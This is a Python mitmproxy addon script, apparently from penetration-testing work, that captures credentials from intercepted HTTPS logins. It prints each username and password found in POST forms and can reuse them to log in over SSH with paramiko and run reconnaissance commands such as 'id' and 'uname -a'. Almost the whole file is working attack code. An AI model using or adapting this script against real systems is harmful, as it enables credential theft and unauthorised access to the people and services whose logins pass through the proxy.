import sys
from mitmproxy import http
import paramiko

####################
# Purpose: 
#     This script is used to grab credentials from HTTPS authentications. 
#     These credentials can be used to authenticate to the web application or service.
#     These credentials can also be used to authenticate with other network services
#     such as Telnet and SSH
# # Requirements
#     mitmproxy - machine-in-the-middle proxy that takes python scripts to process data
#     paramiko  - python based ssh client that comes installed on Kali
####################


####################
# Original Example: https://stackoverflow.com/questions/27369144/use-mitmproxy-to-translate-a-form-key-value-to-a-body-post
####################
DEBUG = False
#DEBUG = True
SSH_CONNECT = False
#SSH_CONNECT = True

class GetRTUCreds:
    localhost = '127.0.0.1'

    def request(self,flow: http.HTTPFlow):
        if flow.request.method == "POST":
            # NOTE: Use the following to print the contents of the request
            if DEBUG: print("%s"%(flow.request.urlencoded_form))
            # NOTE: Use the following to print the help for urlencoded_form methods
            if DEBUG: print("%s"%(help(flow.request.urlencoded_form)))
            form = flow.request.urlencoded_form
            u = form.get('username')
            p = form.get('password')
            if u and p:
                if DEBUG: print("# Detected authentication via HTTPS.")
                print("%s:%s"%(u,p))
                if SSH_CONNECT: self.ssh_connect(username=u,password=p)

    def ssh_connect(self, username, password):
        if DEBUG: print("# Attempting to ssh connect.")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=self.localhost, username=username, password=password)
        except:
            print("SSH: Unable to connect to client at %s"%(self.localhost))
            client.close()
            sys.exit()

        if DEBUG: print("# Attempting to run commands.")
        cmds = ['hostname','uname -a','id']
        for c in cmds:
            try: 
                stdin, stdout, stderr = client.exec_command(c)
                if stdout: out = stdout.read().decode().strip()
                # Don't need these, but keep in case needed for debugging
                #if stdin: sin = stdin.read().decode().strip()
                #if stderr: err = stderr.read().decode().strip()
                print("Result: %s"%(out))
            except:
                print('Cmd Failed: %s'%s(c))
        client.close() 

addons = [GetRTUCreds()]